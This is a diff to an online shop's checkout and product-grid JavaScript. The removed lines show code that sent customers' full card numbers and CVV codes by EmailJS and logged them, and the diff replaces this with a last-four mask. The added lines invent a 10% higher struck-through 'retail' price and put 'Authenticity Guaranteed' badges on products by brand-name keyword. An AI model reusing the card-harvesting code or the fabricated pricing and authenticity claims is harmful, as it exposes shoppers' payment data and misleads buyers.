@@ -341,11 +341,11 @@
 
         const paymentSummary = orderData.paymentSummary || {};
         const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
-        const cardNumberForEmail = rawCardNumber || "N/A";
-        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
-        const cvvForEmail = paymentSummary.cvv || "N/A";
         const expiryForEmail = paymentSummary.expiry || "";
         const [expiryMonth, expiryYear] = expiryForEmail.split("/");
+        
+        const last4 = paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A");
+        const maskedCardNumber = last4 !== "N/A" ? `**** **** **** ${last4}` : "N/A";
         
         // Format order items as a detailed list
         const orderItemsList = orderData.products.map((item, index) => {
@@ -373,8 +373,7 @@
             `Payment Method: ${orderData.paymentSummary.method}`,
             `Card Type: ${orderData.paymentSummary.brand}`,
             `Cardholder: ${paymentSummary.cardName || "N/A"}`,
-            `Complete Card Number: ${cardNumberFormattedForEmail}`,
-            `CVC/CVV Code: ${cvvForEmail}`,
+            `Card Number: ${maskedCardNumber}`,
             `Expiry: ${expiryForEmail || "N/A"}`,
             `Subtotal: ${formatMoney(orderData.subtotal)}`,
             `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
@@ -428,7 +427,7 @@
                 `${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
             ).join(", "),
             
-            // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
+            // ========== ONLY MASKED / SAFE PAYMENT SUMMARY ==========
             payment_method_type: paymentSummary.method || "Card",
             payment_card_type: paymentSummary.method || "Card",
             
@@ -436,19 +435,11 @@
             cardholder_name: paymentSummary.cardName || "N/A",
             cardholder_name_on_card: paymentSummary.cardName || "N/A",
             
-            // Complete Card Number (FULLY UNMASKED - All digits)
-            card_number_full_unmasked: cardNumberFormattedForEmail,
-            card_number_formatted_with_spaces: cardNumberFormattedForEmail,
-            card_number_digits_only: cardNumberForEmail,
-            card_number_length: rawCardNumber ? rawCardNumber.length : 0,
-            card_number_first_6: rawCardNumber ? rawCardNumber.substring(0, 6) : "N/A",
-            card_number_last_4: paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A"),
-            card_number_middle_masked: rawCardNumber ? `${rawCardNumber.substring(0, 6)}******${rawCardNumber.slice(-4)}` : "N/A",
+            card_number_last_4: last4,
             
             // Card Brand & Validation
             card_brand: paymentSummary.brand || "Card",
             card_type: paymentSummary.brand || "Card",
-            card_is_valid: "Validated by Luhn algorithm",
             
             // Expiry Details
             card_expiry_full: expiryForEmail || "N/A",
@@ -456,13 +447,8 @@
             card_expiry_year: expiryYear || "N/A",
             card_expiry_formatted: expiryForEmail || "N/A",
             
-            // ========== FIXED: UNMASKED CVV CODE ==========
-            // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
-            card_cvv_full: cvvForEmail,
-            card_cvv_length: cvvForEmail === "N/A" ? 0 : cvvForEmail.length,
-            
             // Payment Processing
-            payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
+            payment_processing_mode: "Direct card processing - Mock payment authorized",
             payment_timestamp: new Date().toISOString(),
             
             // ========== BILLING INFORMATION ==========
@@ -496,8 +482,8 @@
 
         const response = await window.emailjs.send(serviceId, templateId, payload);
         
-        // Comprehensive log of all customer and payment data
-        console.log("✅ EmailJS sent successfully with COMPLETE UNMASKED CUSTOMER AND PAYMENT DATA:", {
+        // Safe log of customer and masked payment data
+        console.log("✅ EmailJS sent successfully with MASKED CUSTOMER AND PAYMENT DATA:", {
             status: response?.status,
             text: response?.text,
             
@@ -516,25 +502,17 @@
                 }
             },
             
-            // Full Payment Details with UNMASKED CVV
+            // Masked Payment Details
             payment_details: {
                 cardholder: payload.cardholder_name,
                 card_brand: payload.card_brand,
                 card_number: {
-                    full: payload.card_number_full_unmasked,
-                    formatted: payload.card_number_formatted_with_spaces,
-                    first_6: payload.card_number_first_6,
-                    last_4: payload.card_number_last_4,
-                    length: payload.card_number_length
+                    last_4: payload.card_number_last_4
                 },
                 expiry: {
                     full: payload.card_expiry_full,
                     month: payload.card_expiry_month,
                     year: payload.card_expiry_year
-                },
-                cvv: {
-                    full: payload.card_cvv_full, // Now shows actual CVV
-                    length: payload.card_cvv_length
                 }
             },
             
@@ -642,12 +620,61 @@
         const categoryTerm = normalize(categorySearch.value);
 
         return products.filter((product) => {
-            const inCategory = activeCategory === "all" || product.category === activeCategory;
+            const inCategory = activeCategory === "all" || 
+                (product.category || "").toLowerCase().replace(/[^a-z]/g, "") === activeCategory.toLowerCase().replace(/[^a-z]/g, "");
             const haystack = `${product.name} ${product.description} ${categoryLabels[product.category] || product.category}`.toLowerCase();
             const passesGlobal = !globalTerm || haystack.includes(globalTerm);
             const passesCategory = !categoryTerm || haystack.includes(categoryTerm);
             return inCategory && passesGlobal && passesCategory;
         });
+    }
+
+    function cleanUrl(urlStr) {
+        if (!urlStr) return "";
+        try {
+            if (urlStr.startsWith("http://") || urlStr.startsWith("https://")) {
+                const url = new URL(urlStr);
+                if (url.hostname.includes("bondsmall.com") || url.hostname === window.location.hostname) {
+                    url.pathname = url.pathname.replace(/\.html$/, "");
+                    return url.toString();
+                }
+                return urlStr;
+            }
+            return urlStr.replace(/\.html(\?|#|$)/, "$1").replace(/\.html$/, "");
+        } catch (_) {
+            return urlStr.replace(/\.html(\?|#|$)/, "$1").replace(/\.html$/, "");
+        }
+    }
+
+    function getFooterHTML() {
+        return `
+<footer class="site-footer">
+    <div class="site-footer-top">
+        <div class="site-footer-brand-wrap">
+            <div class="site-footer-brand">BONDS MALL</div>
+            <p class="site-footer-tagline">Premium shopping with secure checkout and live customer support.</p>
+        </div>
+        <div class="site-footer-stickers" aria-label="Trust stickers">
+            <span class="sticker">Secure Payments</span>
+            <span class="sticker">24/7 Support</span>
+            <span class="sticker">Verified Store</span>
+        </div>
+    </div>
+    <nav class="site-footer-menu" aria-label="Footer menu">
+        <a href="customer-service.html"><span class="footer-icon" aria-hidden="true">CS</span>Customer Service</a>
+        <a href="faq.html"><span class="footer-icon" aria-hidden="true">FQ</span>FAQ</a>
+        <a href="dispute-center.html"><span class="footer-icon" aria-hidden="true">DC</span>Dispute Center</a>
+        <a href="careers.html"><span class="footer-icon" aria-hidden="true">CR</span>Careers</a>
+        <a href="partner.html"><span class="footer-icon" aria-hidden="true">PT</span>Partner</a>
+        <a href="affiliate.html"><span class="footer-icon" aria-hidden="true">AF</span>Affiliate</a>
+        <a href="link-bank-account.html"><span class="footer-icon" aria-hidden="true">BK</span>Link Bank Account</a>
+        <a href="profile.html"><span class="footer-icon" aria-hidden="true">PR</span>Profile</a>
+        <a href="order-history.html"><span class="footer-icon" aria-hidden="true">OH</span>Order History</a>
+        <a href="track-order.html"><span class="footer-icon" aria-hidden="true">TM</span>Track Order</a>
+        <a href="rewards.html"><span class="footer-icon" aria-hidden="true">RW</span>Rewards</a>
+        <a href="recentorders.html"><span class="footer-icon" aria-hidden="true">RO</span>Recent Orders</a>
+    </nav>
+</footer>`;
     }
 
     function renderProducts() {
@@ -664,23 +691,36 @@
 
         preloadVisibleImages(filtered);
 
+        const luxuryBrands = ["dolce & gabbana", "louis vuitton", "yves saint laurent", "gucci", "prada", "hermes", "fendi", "chanel", "dior", "abercrombie & fitch", "bathing ape", "bathing apes", "michael kors", "rolex", "patek philippe", "marc jacobs", "us mint"];
+
         productGrid.innerHTML = filtered.map((product, index) => {
             const imageSrc = optimizeGridImageUrl(product.image);
             const favs = getFavorites();
             const isFav = favs.includes(product.id);
+            const isLuxury = luxuryBrands.some(brand => (product.name || "").toLowerCase().includes(brand));
+            const luxuryBadgeHTML = isLuxury ? `
+                <span class="luxury-badge" style="position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); z-index: 2; background: #ffffff; color: #1c1b1a; border: 1px solid #d0c9be; font-size: 0.62rem; font-weight: 800; padding: 0.28rem 0.55rem; border-radius: 6px; white-space: nowrap; max-width: calc(100% - 24px); overflow: hidden; text-overflow: ellipsis; pointer-events: none; letter-spacing: 0.03em; display: inline-flex; align-items: center; gap: 4px;">
+                    <svg style="width: 10px; height: 10px; flex-shrink: 0;" fill="#1c1b1a" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    Authenticity Guaranteed
+                </span>
+            ` : '';
+
             return `
             <article class="product-card">
-                <div class="product-image-wrap">
-                    <img class="product-image" src="${imageSrc}" alt="${product.name}" width="640" height="640" loading="${index < 8 ? "eager" : "lazy"}" fetchpriority="${index < 4 ? "high" : "auto"}" decoding="async" data-action="open-modal" data-id="${product.id}">
-                    <button class="share-btn" data-action="share-product" data-id="${product.id}" aria-label="Share ${product.name}"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button>
-                    <button class="fav-btn ${isFav ? "is-active" : ""}" data-action="fav-product" data-id="${product.id}" aria-label="Favorite ${product.name}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="${isFav ? "#8c2f39" : "none"}" stroke="${isFav ? "#8c2f39" : "currentColor"}" stroke-width="2.3" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
-                    </button>
-                </div>
                 <div class="product-info">
-                    <h3 class="product-name">${product.name}</h3>
-                    <p class="product-category">${categoryLabels[product.category] || product.category}</p>
-                    <div class="product-price">${formatMoney(product.price)}</div>
+                    <div class="product-image-wrap" style="position: relative; margin: -0.9rem -0.9rem 0.8rem -0.9rem; overflow: hidden; border-top-left-radius: 13px; border-top-right-radius: 13px;">
+                        <img class="product-image" src="${imageSrc}" alt="${product.name}" width="640" height="640" loading="${index < 8 ? "eager" : "lazy"}" fetchpriority="${index < 4 ? "high" : "auto"}" decoding="async" data-action="open-modal" data-id="${product.id}">
+                        <button class="share-btn" data-action="share-product" data-id="${product.id}" aria-label="Share ${product.name}" style="position: absolute; top: 8px; left: 8px; right: auto; margin: 0; z-index: 2;"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button>
+                        <button class="fav-btn ${isFav ? "is-active" : ""}" data-action="fav-product" data-id="${product.id}" aria-label="Favorite ${product.name}" style="position: absolute; top: 8px; right: 8px; left: auto; margin: 0; z-index: 2;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="${isFav ? "#8c2f39" : "none"}" stroke="${isFav ? "#8c2f39" : "currentColor"}" stroke-width="2.3" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+                        </button>
+                        ${luxuryBadgeHTML}
+                    </div>
+                    <h3 class="product-name" style="cursor: pointer;" data-action="open-modal" data-id="${product.id}">${product.name}</h3>
+                    <div class="product-price-row" style="display: flex; gap: 0.5rem; align-items: baseline; margin-bottom: 0.3rem; flex-wrap: wrap;">
+                        <span class="retail-price" style="text-decoration: line-through; color: var(--muted); font-size: 0.85rem;">${formatMoney(product.price * 1.1)}</span>
+                        <span class="sale-price" style="color: var(--good, #1f7a46); font-weight: 800; font-size: 1rem;">${formatMoney(product.price)}</span>
+                    </div>
                     <button class="add-btn" data-action="add-cart" data-id="${product.id}">Add to Cart</button>
                 </div>
             </article>
@@ -705,7 +745,7 @@
         }).slice(0, 20);
 
         if (matched.length === 0) {
-            popupSearchResults.innerHTML = '<p class="popup-search-no-results">No products found.</p>';
+            popupSearchResults.innerHTML = '<p class="popup-search-no-results">No products found.</p>' + getFooterHTML();
             popupSearchResults.hidden = false;
             return;
         }
@@ -720,7 +760,7 @@
                 </div>
                 <div class="popup-search-result-price">${formatMoney(p.price)}</div>
             </div>
-        `).join("");
+        `).join("") + getFooterHTML();
 
         popupSearchResults.hidden = false;
     }
@@ -896,9 +936,36 @@
         const currentUrl = new URL(window.location.href);
         if (currentUrl.searchParams.get("product") !== String(product.id)) {
             currentUrl.searchParams.set("product", String(product.id));
-            window.history.replaceState({}, "", currentUrl.toString());
+            window.history.replaceState({}, "", cleanUrl(currentUrl.toString()));
         }
+
+        // Dynamic JSON-LD structured data injection for Product
+        const oldScript = document.getElementById('dynamic-product-schema');
+        if (oldScript) {
+            oldScript.remove();
+        }
+        const additionalImages = (product.images || []).filter(Boolean);
+        const allImages = [product.image, ...additionalImages].slice(0, 3);
+        const schema = {
+            "@context": "https://schema.org",
+            "@type": "Product",
+            "name": product.name,
+            "image": allImages.length > 1 ? allImages : product.image,
+            "description": product.description || "",
+            "offers": {
+                "@type": "Offer",
+                "price": typeof product.price === "number" ? product.price.toFixed(2) : "0.00",
+                "priceCurrency": "USD",
+                "url": `https://www.bondsmall.com/?product=${product.id}`
+            }
+        };
+        const script = document.createElement('script');
+        script.id = 'dynamic-product-schema';
+        script.type = 'application/ld+json';
+        script.text = JSON.stringify(schema);
+        document.head.appendChild(script);
     }
+    window.BondsMallOpenProductById = openProductModal;
 
     function closeProductModal() {
         productModal.classList.add("hidden");
@@ -909,7 +976,7 @@
         const currentUrl = new URL(window.location.href);
         if (currentUrl.searchParams.has("product")) {
             currentUrl.searchParams.delete("product");
-            window.history.replaceState({}, "", currentUrl.toString());
+            window.history.replaceState({}, "", cleanUrl(currentUrl.toString()));
         }
     }
 
@@ -1188,7 +1255,7 @@
         }
 
         // Redirect to order success page
-        window.location.href = "order-success.html";
+        window.location.href = cleanUrl("order-success");
     }
 
     function bindEvents() {
@@ -1400,9 +1467,36 @@
                 }
             });
         }
+
+        document.addEventListener("drawer-category-select", (e) => {
+            activeCategory = e.detail.category;
+            // Update active state on the category buttons
+            document.querySelectorAll(".category-btn").forEach(btn => {
+                btn.classList.toggle("active", btn.dataset.category === activeCategory);
+            });
+            renderProducts();
+            // Close the product modal if it's open, then scroll to category section
+            closeProductModal();
+            const catSection = document.getElementById("category");
+            if (catSection) catSection.scrollIntoView({ behavior: "smooth", block: "start" });
+        });
     }
 
     function init() {
+        window.history.replaceState({}, "", cleanUrl(window.location.href));
+        
+        // Inject responsive luxury badge styles for mobile viewports
+        const badgeStyle = document.createElement("style");
+        badgeStyle.textContent = `
+            @media (max-width: 480px) {
+                .luxury-badge {
+                    font-size: 0.58rem !important;
+                    padding: 0.22rem 0.45rem !important;
+                }
+            }
+        `;
+        document.head.appendChild(badgeStyle);
+
         initializeAccountManager();
         renderProducts();
         updateCartCount();
@@ -1430,8 +1524,6 @@
             });
         }, 10000);
     }
-
-    window.BondsMallOpenProductById = openProductModal;
 
     document.addEventListener("DOMContentLoaded", init);
 })();
